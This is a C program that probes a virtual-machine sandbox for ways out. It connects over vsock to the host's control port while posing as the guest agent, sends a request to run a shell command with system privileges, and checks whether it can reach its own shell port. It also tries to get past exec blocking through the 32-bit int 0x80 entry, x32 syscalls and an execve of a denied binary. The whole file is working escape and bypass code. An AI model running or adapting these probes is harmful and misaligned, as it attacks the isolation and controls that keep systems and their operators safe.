#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <linux/vm_sockets.h>
#include <sys/syscall.h>

static void try_vsock(unsigned cid, unsigned port, const char *what) {
    int s = socket(AF_VSOCK, SOCK_STREAM, 0);
    struct sockaddr_vm a = { .svm_family = AF_VSOCK, .svm_cid = cid, .svm_port = port };
    int r = connect(s, (struct sockaddr *)&a, sizeof a);
    if (r == 0) {
        const char *req = "{\"id\":1,\"argv\":[\"/bin/sh\",\"-c\",\"id\"],\"tty\":null,\"system\":true}\n";
        write(s, req, strlen(req));
        char buf[256] = {0};
        int n = read(s, buf, sizeof buf - 1);
        printf("%-40s CONNECTED, read %d bytes\n", what, n);
    } else {
        printf("%-40s refused: %s\n", what, strerror(errno));
    }
    close(s);
}

static void try_exec(const char *what, void (*f)(void)) {
    pid_t p = fork();
    if (p == 0) { f(); _exit(42); }
    int st; waitpid(p, &st, 0);
    if (WIFSIGNALED(st)) printf("%-40s killed by signal %d\n", what, WTERMSIG(st));
    else printf("%-40s exited %d%s\n", what, WEXITSTATUS(st), WEXITSTATUS(st) == 42 ? " (exec failed)" : " (EXECUTED!)");
}

static char *argv_[] = { "/bin/true", 0 };
static void int80(void) {
    // 32-bit execve (nr 11) through the compat entry point.
    long r; asm volatile("int $0x80" : "=a"(r) : "a"(11), "b"("/bin/true"), "c"(argv_), "d"(0) : "memory");
}
static void x32(void) { syscall(0x40000000 | 520, "/bin/true", argv_, 0); }
static void native(void) { execve("/usr/bin/perl", (char *[]){"perl", "-e", "1", 0}, 0); }

int main(void) {
    printf("uid %d\n", getuid());
    try_vsock(2, 1000, "host control port (impersonate agent)");
    try_vsock(1, 1024, "own shell port via vsock loopback");
    try_vsock(3, 1024, "own shell port via own CID");
    try_vsock(2, 1024, "host port 1024");
    try_exec("32-bit int 0x80 execve", int80);
    try_exec("x32 execve", x32);
    try_exec("native execve of denied perl", native);
    return 0;
}
